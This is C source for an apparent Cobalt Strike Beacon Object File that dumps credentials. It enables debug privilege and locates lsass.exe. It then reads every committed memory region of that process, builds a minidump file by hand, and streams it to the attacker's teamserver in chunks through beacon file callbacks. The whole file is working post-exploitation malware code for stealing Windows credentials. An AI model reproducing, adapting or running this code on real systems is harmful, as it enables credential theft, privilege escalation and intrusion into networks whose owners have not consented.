#include <windows.h>
#include <tlhelp32.h>
#include <Winnt.h>
#include "bofdefs.h"
#include "beacon.h"


/*https://github.com/EspressoCake/DLL-Exports-Extraction-BOF/blob/main/src/main.c*/
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {
    //Intializes random number generator to create fileId 
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    //8 bytes for fileId and fileSize
    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);
 
    //pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    //pack on fileSize as 4-byte int second
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;

    //pack on the file name last
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex] = fileName[i];
        packedIndex++;
    }

     BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    if (fileSize > (1024 * 900)){
      
      //Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
      int numOfChunks = (fileSize / (1024 * 900)) + 1;
      int index = 0;
      int chunkSize = 1024 * 900;

      while(index < fileSize) {
        if (fileSize - index > chunkSize){//We have plenty of room, grab the chunk and move on
            
            /*First 4 are the fileId 
	    then account for length of file
	    then a byte for the good-measure null byte to be included
            then lastly is the 4-byte int of the fileSize*/
            int chunkLength = 4 + chunkSize;
            char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
            
            //pack on fileId as 4-byte int first
            packedChunk[0] = (fileId >> 24) & 0xFF;
            packedChunk[1] = (fileId >> 16) & 0xFF;
            packedChunk[2] = (fileId >> 8) & 0xFF;
            packedChunk[3] = fileId & 0xFF;

            int chunkIndex = 4;

            //pack on the file name last
            for (int i = index; i < index + chunkSize; i++) {
                packedChunk[chunkIndex] = returnData[i];
                chunkIndex++;
            }

	     BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);

        } else {//This chunk is smaller than the chunkSize, so we have to be careful with our measurements
           
	    int lastChunkLength = fileSize - index + 4;
            char* lastChunk = (char*) MSVCRT$malloc(lastChunkLength);
            
	    //pack on fileId as 4-byte int first
            lastChunk[0] = (fileId >> 24) & 0xFF;
            lastChunk[1] = (fileId >> 16) & 0xFF;
            lastChunk[2] = (fileId >> 8) & 0xFF;
            lastChunk[3] = fileId & 0xFF;
            int lastChunkIndex = 4;
            
	    //pack on the file name last
            for (int i = index; i < fileSize; i++) {
                lastChunk[lastChunkIndex] = returnData[i];
                lastChunkIndex++;
            }
		BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
        }
        
	index = index + chunkSize;

      }

    } else {

        /*first 4 are the fileId
        then account for length of file
        then a byte for the good-measure null byte to be included
        then lastly is the 4-byte int of the fileSize*/
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
        
        //pack on fileId as 4-byte int first
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;

        //pack on the file name last
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex] = returnData[i];
            chunkIndex++;
        }
	
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
    }


    //We need to tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    
    //pack on fileId as 4-byte int first
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

    return; 
}

/*From Sektor7 Malware courses*/
int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!KERNEL32$Process32First(hProcSnap, &pe32)) {
                NTDLL$NtClose(hProcSnap);
                return 0;
        }
                
        while (KERNEL32$Process32Next(hProcSnap, &pe32)) {
                if (MSVCRT$strcmp(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        NTDLL$NtClose(hProcSnap);
                
        return pid;
}


PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    SIZE_T bytesRead;
    NTSTATUS status;

    
    status =  NTDLL$NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
    if (!NT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to query process information. NTSTATUS: 0x%x\n", status);
        return NULL;
    }

   
    PEB peb;
    status = NTDLL$NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);
    if (!NT_SUCCESS(status))
    {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read PEB from remote process\n");
        return NULL;
    }

    
    PEB_LDR_DATA ldr;
    status = NTDLL$NtReadVirtualMemory(hProcess, peb.Ldr, &ldr, sizeof(ldr), &bytesRead);
    if (!NT_SUCCESS(status))
    {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read PEB_LDR_DATA from remote process\n");
        return NULL;
    }

    
    LIST_ENTRY* pListHead = &ldr.InMemoryOrderModuleList;
    LIST_ENTRY* pListEntry = ldr.InMemoryOrderModuleList.Flink;

    do {
        // Read the LIST_ENTRY to get the next module
        LIST_ENTRY currentEntry;
        status = NTDLL$NtReadVirtualMemory(hProcess, pListEntry, &currentEntry, sizeof(LIST_ENTRY), &bytesRead);
        if (!NT_SUCCESS(status))
        {
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read LIST_ENTRY from remote process at 0x%p\n", pListEntry);
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error Code: %d\n", KERNEL32$GetLastError());
            return NULL;
        }

        // Adjust the pointer to the containing LDR_DATA_TABLE_ENTRY
        LDR_DATA_TABLE_ENTRY ldrEntry;
        status = NTDLL$NtReadVirtualMemory(hProcess, (PBYTE)pListEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &ldrEntry, sizeof(ldrEntry), &bytesRead);
        if (!NT_SUCCESS(status))
         {
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read LDR_DATA_TABLE_ENTRY from remote process\n");
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error Code: %d\n", KERNEL32$GetLastError());
            return NULL;
        }


        wchar_t dllBaseName[MAX_PATH];
        SIZE_T maxReadSize;
        if (ldrEntry.BaseDllName.Length < sizeof(dllBaseName)) {
            maxReadSize = ldrEntry.BaseDllName.Length;
        }
        else {
            maxReadSize = sizeof(dllBaseName) - sizeof(wchar_t);
        }

        status =  NTDLL$NtReadVirtualMemory(hProcess, ldrEntry.BaseDllName.Buffer, dllBaseName, maxReadSize, &bytesRead); 
        if (!NT_SUCCESS(status))
        {
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read DLL name from remote process\n");
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error Code: %d\n", KERNEL32$GetLastError());
            return NULL;
        }

        // Null-terminate the string
        dllBaseName[maxReadSize / sizeof(wchar_t)] = L'\0';

        if (MSVCRT$_wcsicmp(dllBaseName, dllName) == 0) {
            return ldrEntry.DllBase;
        }

        // Move to the next entry in the list
        pListEntry = currentEntry.Flink;

    } while (pListEntry != pListHead);

     BeaconPrintf(CALLBACK_OUTPUT, "[-] DLL not found in remote process\n");
    return NULL;
}


BOOL EnableDebugPriv() {

    HANDLE hToken;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };


    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenProcessToken failed: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }


    if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &TokenPrivileges.Privileges[0].Luid))
    {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] LookupPrivilegeValue failed: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    

    
    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] AdjustTokenPrivileges failed: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    return TRUE;
}


void go(char* arg, int len) {
    
    HANDLE hProc;  
    NTSTATUS status;

    long long max_mem = 0x7FFFFFFEFFFF;
    VOID* mem_address = NULL;

    BYTE* memory_regions = NULL;
    SIZE_T memory_regions_size = 0;
    MEMORY_64_INFO* mem64info_list = NULL;
    SIZE_T mem64infolist_count = 0;
    LPVOID lsasrvdll_address = NULL;





    if (!EnableDebugPriv()) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not enable SE_DEBUG_PRIVILEGE. Error: %d\n", KERNEL32$GetLastError());
        return;
    }

    DWORD pid = FindTarget("lsass.exe");

    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)pid;
    OBJECT_ATTRIBUTES objectAttributes = { 0 };

    // Get handle to lsass
    status = NTDLL$NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objectAttributes, &clientId);
    if (!NT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] Error in NtOpenProcess\n");
         BeaconPrintf(CALLBACK_OUTPUT, "NTSTATUS: 0x%08x\n", status);
        NTDLL$NtClose(hProc);
        return;
    }

    lsasrvdll_address = GetDllBaseAddress(hProc, L"lsasrv.dll");
    if (lsasrvdll_address == NULL) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not get address of lsasrv.dll. Error: 0x%08x\n", KERNEL32$GetLastError());
        return;
    }

    SIZE_T lsasrvdll_size = 0;
    BOOL test_address = FALSE;  

    while ((ULONG_PTR)mem_address < max_mem) {
        
        MEMORY_BASIC_INFORMATION mbi = { 0 };
        SIZE_T returnLength = 0;
        status = NTDLL$NtQueryVirtualMemory(hProc, mem_address, MemoryBasicInformation, &mbi, sizeof(mbi), &returnLength);
        
        if (status != 0) {
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%08X\n", status);
            continue;
        }


        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            

            mem64info_list = (MEMORY_64_INFO*)MSVCRT$realloc(mem64info_list, (mem64infolist_count + 1) * sizeof(MEMORY_64_INFO));
            if (mem64info_list == NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Could not reallocate memory for mem64info_list. Error: %d\n", KERNEL32$GetLastError());
                return;
            }

            mem64info_list[mem64infolist_count].Address = mbi.BaseAddress;
            mem64info_list[mem64infolist_count].Size = mbi.RegionSize;
            mem64infolist_count++;

            
            BYTE* buffer = (BYTE*)MSVCRT$malloc(mbi.RegionSize);
            if (buffer == NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Could not allocate memory for buffer. Error: %d\n", KERNEL32$GetLastError());
                return;
            }

            ULONG bytesRead = 0;
            status = NTDLL$NtReadVirtualMemory(hProc, mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead);
            if (status != 0 && status != STATUS_PARTIAL_COPY) {
                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x%08X\n", status);
            }

            memory_regions = (BYTE*)MSVCRT$realloc(memory_regions, memory_regions_size + mbi.RegionSize);
            if (memory_regions == NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Could not reallocate memory for memory_regions. Error: %d\n", KERNEL32$GetLastError());
                return;
            }

            
            MSVCRT$memcpy(memory_regions + memory_regions_size, buffer, mbi.RegionSize);
            memory_regions_size += mbi.RegionSize;
            MSVCRT$free(buffer);

                      
            if ((PVOID)mbi.BaseAddress == (PVOID)lsasrvdll_address) {
            test_address = TRUE;
        }

            if (test_address) {
                   if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdll_address) {
                    test_address = FALSE;
                }
               else {
                lsasrvdll_size += mbi.RegionSize;
                }
            }
        }

        mem_address = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }


    //Start creating the minidump file format
    MINIDUMP_HEADER header = { 0 };
    header.Signature = 0x504d444d;
    header.Version = 0xa793;
    header.NumberOfStreams = 0x3;
    header.StreamDirectoryRva = 0x20;


    // Stream Directory
    MINIDUMP_STREAM_DIRECTORY streamDirectoryEntry1 = { 0 };
    streamDirectoryEntry1.StreamType = 4;
    streamDirectoryEntry1.Size = 112;
    streamDirectoryEntry1.Location = 0x7c;


    MINIDUMP_STREAM_DIRECTORY streamDirectoryEntry2 = { 0 };
    streamDirectoryEntry2.StreamType = 7;
    streamDirectoryEntry2.Size = 56;
    streamDirectoryEntry2.Location = 0x44;


    MINIDUMP_STREAM_DIRECTORY streamDirectoryEntry3 = { 0 };
    streamDirectoryEntry3.StreamType = 9;
    streamDirectoryEntry3.Size = (16 + 16 * mem64infolist_count);
    streamDirectoryEntry3.Location = 0x12A;

 
    RTL_OSVERSIONINFOW osVersion;
    NTDLL$RtlGetVersion(&osVersion);


    // System Info Stream
    MINIDUMP_SYSTEM_INFO systemInfoStream = { 0 };
    systemInfoStream.ProcessorArchitecture = 0x9;
    systemInfoStream.MajorVersion = osVersion.dwMajorVersion;
    systemInfoStream.MinorVersion = osVersion.dwMinorVersion;
    systemInfoStream.BuildNumber = osVersion.dwBuildNumber;


    // Module List
    MODULE_LIST_STREAM moduleListStream = { 0 };
    moduleListStream.NumberOfModules = 1;
    moduleListStream.BaseAddress = lsasrvdll_address;
    moduleListStream.Size = (ULONG)lsasrvdll_size;
    moduleListStream.PointerName = 0xE8;


    wchar_t dllPath[] = L"C:\\Windows\\System32\\lsasrv.dll";
    UNICODE_STRING dllStruct = { 0 };


    dllStruct.Length = MSVCRT$wcslen(dllPath) * 2;
    dllStruct.Buffer = (wchar_t*)MSVCRT$malloc(dllStruct.Length);
    if (dllStruct.Buffer == NULL) {
     BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to allocate memory for dllStruct.Buffer\n");
    return;
    }

    
    MSVCRT$wcscpy_s(dllStruct.Buffer, (MSVCRT$wcslen(dllPath) * 2), dllPath);



    SIZE_T number_of_entries = mem64infolist_count;
    SIZE_T offset_mem_regions = 0x12A + 16 + (16 * number_of_entries);

    MEMORY64_LIST_STREAM memory64ListStream = { 0 };
    memory64ListStream.NumberOfEntries = number_of_entries;
    memory64ListStream.MemoryRegionsBaseAddress = offset_mem_regions;


    //Writes structs to byte array and then we write it to file or whatever
    char padding[] = {0x00, 0x00};
    size_t totalSize = sizeof(header)
    + sizeof(streamDirectoryEntry1)
    + sizeof(streamDirectoryEntry2)
    + sizeof(streamDirectoryEntry3)
    + sizeof(systemInfoStream)
    + sizeof(moduleListStream)
    + sizeof(dllStruct.Length)  
    + dllStruct.Length   
    + sizeof(padding)    
    + sizeof(memory64ListStream)
    + mem64infolist_count * sizeof(MEMORY_64_INFO)
    + memory_regions_size;

    DWORD bytesWritten;
    BYTE* dmpFileBuffer = (BYTE*)MSVCRT$malloc(totalSize);
    BYTE* currentPointer = dmpFileBuffer;



    //Write each structure to byde array and then move pointer as starting address for next structure.

    MSVCRT$memcpy(currentPointer, &header, sizeof(header));
    currentPointer += sizeof(header);
    MSVCRT$memcpy(currentPointer, &streamDirectoryEntry1, sizeof(streamDirectoryEntry1));
    currentPointer += sizeof(streamDirectoryEntry1);
	
    MSVCRT$memcpy(currentPointer, &streamDirectoryEntry2, sizeof(streamDirectoryEntry2));
    currentPointer += sizeof(streamDirectoryEntry2);
    
    MSVCRT$memcpy(currentPointer, &streamDirectoryEntry3, sizeof(streamDirectoryEntry3));
    currentPointer += sizeof(streamDirectoryEntry3);
    
    MSVCRT$memcpy(currentPointer, &systemInfoStream, sizeof(systemInfoStream));
    currentPointer += sizeof(systemInfoStream);

    MSVCRT$memcpy(currentPointer, &moduleListStream, sizeof(moduleListStream));
    currentPointer += sizeof(moduleListStream);
	
    MSVCRT$memcpy(currentPointer, &dllStruct.Length, sizeof(dllStruct.Length));
    currentPointer += sizeof(dllStruct.Length);
	
    MSVCRT$memcpy(currentPointer, dllStruct.Buffer, dllStruct.Length);
    currentPointer += dllStruct.Length;
      
    MSVCRT$memcpy(currentPointer, padding, sizeof(padding));
    currentPointer += sizeof(padding);
    
    MSVCRT$memcpy(currentPointer, &memory64ListStream, sizeof(memory64ListStream));
    currentPointer += sizeof(memory64ListStream);
    
        for (SIZE_T i = 0; i < mem64infolist_count; i++) {
            MSVCRT$memcpy(currentPointer, &mem64info_list[i], sizeof(MEMORY_64_INFO));
            currentPointer += sizeof(MEMORY_64_INFO);
   
        }
    MSVCRT$memcpy(currentPointer, memory_regions, memory_regions_size);

     char dmpFile[] = "bof.dmp";

    downloadFile(dmpFile, MSVCRT$strlen(dmpFile), dmpFileBuffer, totalSize);

    //Cleanup
    MSVCRT$free(dmpFileBuffer);
    MSVCRT$free(dllStruct.Buffer);
    NTDLL$NtClose(hProc);
    return;
}
